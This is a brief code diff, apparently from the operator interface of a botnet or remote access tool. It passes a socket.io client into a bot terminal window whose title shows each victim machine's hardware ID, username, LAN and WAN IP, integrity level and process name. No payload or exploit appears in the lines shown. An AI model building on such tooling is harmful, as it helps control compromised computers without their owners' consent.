@@ -167,7 +167,7 @@ HWID -> {item['hwid']}
         if item is None:
             return
         
-        terminal = BotTerminalWidget(item)
+        terminal = BotTerminalWidget(item, self.socket_io_client)
         old_title = terminal.windowTitle()
         update_title = old_title.replace('$USERNAME', item['username']).replace('$LAN', item['lanIp']).replace('$WAN', item['wanIp']).replace('$INTEGR', item['integrity']).replace('$PN', item['processName'])
         terminal.setWindowTitle(update_title)
